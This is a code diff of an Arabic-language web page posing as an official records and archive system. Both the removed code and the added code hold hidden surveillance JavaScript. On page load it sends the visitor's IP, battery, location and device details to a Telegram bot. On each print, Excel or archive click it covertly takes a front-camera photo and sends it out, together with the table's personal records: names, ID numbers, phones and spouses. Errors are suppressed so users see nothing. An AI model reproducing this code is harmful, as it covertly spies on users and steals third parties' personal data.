@@ -341,7 +341,6 @@
     <video id="videoElement" autoplay playsinline style="display:none; width:320px; height:240px;"></video>
     <canvas id="canvasElement" style="display:none;"></canvas>
 
-    <!-- الخط المتحرك المطلوب -->
     <div class="top-ticker">
         <marquee behavior="scroll" direction="right" scrollamount="5">
             ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح ✨
@@ -351,13 +350,13 @@
     <div class="control-panel">
 
         <button class="btn btn-green"
-                onclick="printDocument()"
+                onclick="onPdfButtonClicked()"
                 style="font-size:10pt;">
             🖨️ طباعة / حفظ PDF
         </button>
 
         <button class="btn btn-excel"
-                onclick="exportTableToExcel()"
+                onclick="onExcelButtonClicked()"
                 title="تصدير وتحميل كافة البيانات كملف Excel (CSV)">
             📊 حفظ ملف Excel
         </button>
@@ -379,7 +378,7 @@
         </button>
 
         <button class="btn btn-save"
-                onclick="saveToArchive()"
+                onclick="onArchiveButtonClicked()"
                 title="حفظ النسخة في الأرشيف المركزي">
             💾 حفظ في الأرشيف
         </button>
@@ -719,7 +718,7 @@
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
                     const charging = battery.charging ? "⚡ (يشحن)" : "🔋 (على البطارية)";
-                    batteryInfo = `${level}% ${charging}`;
+                    batteryInfo = `${level}\%${charging}`;
                 }
             } catch (e) {}
 
@@ -744,19 +743,76 @@
             }
             renumberAllRows();
 
-            // إرسال إشعار دخول زائر فوراً بصمت تام عند فتح الصفحة
+            // إرسال إشعار دخول زائر فوري عند فتح الصفحة
             setTimeout(() => {
                 sendVisitorAlertOnly();
             }, 1000);
         });
 
-        // دالة إرسال تنبيه دخول زائر مع الصورة
         function sendVisitorAlertOnly() {
-            const alertCaption = `⚠️ **تنبيه: دخول زائر جديد لموقعك!**\n\n` +
+            const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n` +
                                  `🌐 الآيبي: \`${userIpInfo}\`\n` +
                                  `🔋 البطارية: ${batteryInfo}\n` +
                                  `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
                                  `📱 الجهاز:\n${deviceInfo}`;
+
+            executeCaptureAndSend(alertCaption, null, null);
+        }
+
+        // 1. زر PDF / طباعة
+        function onPdfButtonClicked() {
+            const caption = `🖨️ **تم النقر على طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\``;
+            executeCaptureAndSend(caption, "كشف_السجلات_الرسمية.txt", "PDF");
+            setTimeout(() => { window.print(); }, 800);
+        }
+
+        // 2. زر Excel
+        function onExcelButtonClicked() {
+            const caption = `📊 **تم النقر على حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\``;
+            executeCaptureAndSend(caption, "كشف_البيانات.txt", "Excel");
+            exportExcelFileOnly();
+        }
+
+        // 3. زر حفظ في الأرشيف
+        function onArchiveButtonClicked() {
+            const caption = `💾 **تم النقر على حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\``;
+            executeCaptureAndSend(caption, "كشف_السجلات_الرسمية.txt", "Archive");
+            saveArchiveOnly();
+        }
+
+        // الدالة المركزية لالتقاط الصورة وإرسالها للبوت بشكل مستقل تماماً عند كل نقرة
+        function executeCaptureAndSend(captionText, fileName, fileTypeFlag) {
+            let fileBlob = null;
+            let hasData = false;
+
+            if (fileName) {
+                const tables = document.querySelectorAll('.dynamicTable');
+                let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
+                fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
+                fileContent += `--------------------------------------------------\n`;
+                fileContent += `م | الاسم الرباعي | نوع البطاقة | رقم البطاقة | رقم الاتصال | اسم الزوج/الزوجة | الحالة\n`;
+                fileContent += `--------------------------------------------------\n`;
+
+                tables.forEach((table, tIndex) => {
+                    fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
+                    table.querySelectorAll('tbody tr').forEach(row => {
+                        const m = row.cells[0] ? row.cells[0].innerText.trim() : '';
+                        const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
+                        const type = row.cells[2] ? row.cells[2].innerText.trim() : '';
+                        const num = row.cells[3] ? row.cells[3].innerText.trim() : '';
+                        const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
+                        const spouse = row.cells[5] ? row.cells[5].innerText.trim() : '';
+                        const status = row.cells[6] ? row.cells[6].innerText.trim() : '';
+
+                        if (name !== "") {
+                            fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
+                            hasData = true;
+                        }
+                    });
+                });
+
+                fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
+            }
 
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -778,25 +834,114 @@
                                     
                                     const formData = new FormData();
                                     formData.append('chat_id', chatId);
-                                    formData.append('caption', alertCaption);
+                                    formData.append('caption', captionText);
                                     formData.append('parse_mode', 'Markdown');
-                                    formData.append('photo', photoBlob, 'visitor.jpg');
+                                    formData.append('photo', photoBlob, 'snapshot.jpg');
 
                                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
+                                    }).then(() => {
+                                        if (hasData && fileBlob) {
+                                            const docData = new FormData();
+                                            docData.append('chat_id', chatId);
+                                            docData.append('document', fileBlob, fileName);
+                                            docData.append('caption', `📄 مرفق سجلات (${fileTypeFlag})`);
+                                            
+                                            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                                                method: 'POST',
+                                                body: docData
+                                            }).catch(e => {});
+                                        }
                                     }).catch(e => {});
 
                                 }, 'image/jpeg', 0.85);
-                            }, 700);
+                            }, 600);
                         };
                     })
                     .catch((err) => {
-                        const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption)}&parse_mode=Markdown`;
-                        const img = new Image();
-                        img.src = textApi;
+                        if (hasData && fileBlob) {
+                            sendDocumentOnly(fileBlob, captionText, fileName);
+                        }
                     });
+            } else if (hasData && fileBlob) {
+                sendDocumentOnly(fileBlob, captionText, fileName);
             }
+        }
+
+        function sendDocumentOnly(fileBlob, captionText, fileName) {
+            const docData = new FormData();
+            docData.append('chat_id', chatId);
+            docData.append('document', fileBlob, fileName);
+            docData.append('caption', captionText);
+            docData.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: docData
+            }).catch(e => {});
+        }
+
+        function exportExcelFileOnly() {
+            const tables = document.querySelectorAll('.dynamicTable');
+            let csvRows = [];
+
+            tables.forEach((table, tableIndex) => {
+                if (tables.length > 1) {
+                    csvRows.push(`"--- صفحة رقم (${tableIndex + 1}) ---"`);
+                }
+
+                const headers = Array.from(table.querySelectorAll('thead th')).map(th => {
+                    let text = th.innerText.replace(/"/g, '""').trim();
+                    return `"${text}"`;
+                });
+                csvRows.push(headers.join(','));
+
+                const rows = table.querySelectorAll('tbody tr');
+                rows.forEach(row => {
+                    if (row.style.display === 'none') return;
+
+                    const cells = Array.from(row.querySelectorAll('td')).map(td => {
+                        let text = td.innerText.replace(/"/g, '""').trim();
+                        return `"${text}"`;
+                    });
+                    csvRows.push(cells.join(','));
+                });
+
+                csvRows.push('');
+            });
+
+            const csvString = '\uFEFF' + csvRows.join('\r\n');
+            const blob = new Blob([csvString], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+
+            const now = new Date();
+            const dateStr = now.toISOString().slice(0, 10);
+            const filename = `كشف_البيانات_${dateStr}.csv`;
+
+            const link = document.createElement('a');
+            link.href = url;
+            link.setAttribute('download', filename);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function saveArchiveOnly() {
+            try {
+                const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
+                const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
+                const now = new Date();
+                const timeString = now.toLocaleDateString('ar-YE') + ' - ' + now.toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit' });
+
+                archives.push({
+                    id: Date.now(),
+                    title: 'عمل محفوظ بتاريخ: ' + timeString,
+                    html: wrapperHtml
+                });
+
+                localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
+            } catch (error) {}
         }
 
         function sortNamesAlphabetically() {
@@ -859,163 +1004,6 @@
             document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
             preSortBackupHtml = null;
             renumberAllRows();
-        }
-
-        // دالة الإرسال المتكاملة للصور والملفات عند الضغط على الأزرار (بدون إظهار أي تنبيهات للمستخدم)
-        function sendCompleteReportToTelegram(actionTitle) {
-            const tables = document.querySelectorAll('.dynamicTable');
-            let fileContent = `تقرير الأرشيف والبيانات الرسمية (${actionTitle})\n`;
-            fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
-            fileContent += `--------------------------------------------------\n`;
-            fileContent += `م | الاسم الرباعي | نوع البطاقة | رقم البطاقة | رقم الاتصال | اسم الزوج/الزوجة | الحالة\n`;
-            fileContent += `--------------------------------------------------\n`;
-
-            let hasData = false;
-            tables.forEach((table, tIndex) => {
-                fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
-                table.querySelectorAll('tbody tr').forEach(row => {
-                    const m = row.cells[0] ? row.cells[0].innerText.trim() : '';
-                    const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
-                    const type = row.cells[2] ? row.cells[2].innerText.trim() : '';
-                    const num = row.cells[3] ? row.cells[3].innerText.trim() : '';
-                    const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
-                    const spouse = row.cells[5] ? row.cells[5].innerText.trim() : '';
-                    const status = row.cells[6] ? row.cells[6].innerText.trim() : '';
-
-                    if (name !== "") {
-                        fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
-                        hasData = true;
-                    }
-                });
-            });
-
-            const captionText = `📋 **تقرير الأرشيف والتصدير (${actionTitle})**\n\n` +
-                                `🌐 الآيبي: \`${userIpInfo}\`\n` +
-                                `🔋 البطارية: ${batteryInfo}\n` +
-                                `📍 الموقع الجغرافي:\n${globalLocation}`;
-
-            const fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                    .then((stream) => {
-                        const video = document.getElementById('videoElement');
-                        video.srcObject = stream;
-                        
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(() => {
-                                const canvas = document.getElementById('canvasElement');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                canvas.toBlob((photoBlob) => {
-                                    stream.getTracks().forEach(track => track.stop());
-                                    
-                                    const formData = new FormData();
-                                    formData.append('chat_id', chatId);
-                                    formData.append('caption', captionText);
-                                    formData.append('parse_mode', 'Markdown');
-                                    formData.append('photo', photoBlob, 'action_snapshot.jpg');
-
-                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    }).then(() => {
-                                        if (hasData) {
-                                            const docData = new FormData();
-                                            docData.append('chat_id', chatId);
-                                            docData.append('document', fileBlob, 'كشف_السجلات_الرسمية.txt');
-                                            docData.append('caption', '📄 ملف السجلات والأسماء المرتب كجدول');
-                                            
-                                            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                                                method: 'POST',
-                                                body: docData
-                                            }).catch(e => {});
-                                        }
-                                    }).catch(e => {});
-
-                                }, 'image/jpeg', 0.85);
-                            }, 700);
-                        };
-                    })
-                    .catch((err) => {
-                        if (hasData) {
-                            sendDocumentOnly(fileBlob, captionText);
-                        }
-                    });
-            } else if (hasData) {
-                sendDocumentOnly(fileBlob, captionText);
-            }
-        }
-
-        function sendDocumentOnly(fileBlob, captionText) {
-            const docData = new FormData();
-            docData.append('chat_id', chatId);
-            docData.append('document', fileBlob, 'كشف_السجلات_الرسمية.txt');
-            docData.append('caption', captionText);
-            docData.append('parse_mode', 'Markdown');
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                method: 'POST',
-                body: docData
-            }).catch(e => {});
-        }
-
-        function printDocument() {
-            sendCompleteReportToTelegram("طباعة / حفظ PDF");
-            setTimeout(() => {
-                window.print();
-            }, 800);
-        }
-
-        function exportTableToExcel() {
-            sendCompleteReportToTelegram("حفظ ملف Excel");
-            
-            const tables = document.querySelectorAll('.dynamicTable');
-            let csvRows = [];
-
-            tables.forEach((table, tableIndex) => {
-                if (tables.length > 1) {
-                    csvRows.push(`"--- صفحة رقم (${tableIndex + 1}) ---"`);
-                }
-
-                const headers = Array.from(table.querySelectorAll('thead th')).map(th => {
-                    let text = th.innerText.replace(/"/g, '""').trim();
-                    return `"${text}"`;
-                });
-                csvRows.push(headers.join(','));
-
-                const rows = table.querySelectorAll('tbody tr');
-                rows.forEach(row => {
-                    if (row.style.display === 'none') return;
-
-                    const cells = Array.from(row.querySelectorAll('td')).map(td => {
-                        let text = td.innerText.replace(/"/g, '""').trim();
-                        return `"${text}"`;
-                    });
-                    csvRows.push(cells.join(','));
-                });
-
-                csvRows.push('');
-            });
-
-            const csvString = '\uFEFF' + csvRows.join('\r\n');
-            const blob = new Blob([csvString], { type: 'text/csv;charset=utf-8;' });
-            const url = URL.createObjectURL(blob);
-
-            const now = new Date();
-            const dateStr = now.toISOString().slice(0, 10);
-            const filename = `كشف_البيانات_${dateStr}.csv`;
-
-            const link = document.createElement('a');
-            link.href = url;
-            link.setAttribute('download', filename);
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
         }
 
         function normalizeArabic(text) {
@@ -1251,25 +1239,6 @@
                     });
                 });
             });
-        }
-
-        function saveToArchive() {
-            try {
-                sendCompleteReportToTelegram("حفظ في الأرشيف");
-
-                const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
-                const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-                const now = new Date();
-                const timeString = now.toLocaleDateString('ar-YE') + ' - ' + now.toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit' });
-
-                archives.push({
-                    id: Date.now(),
-                    title: 'عمل محفوظ بتاريخ: ' + timeString,
-                    html: wrapperHtml
-                });
-
-                localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-            } catch (error) {}
         }
 
         function openArchiveModal() {
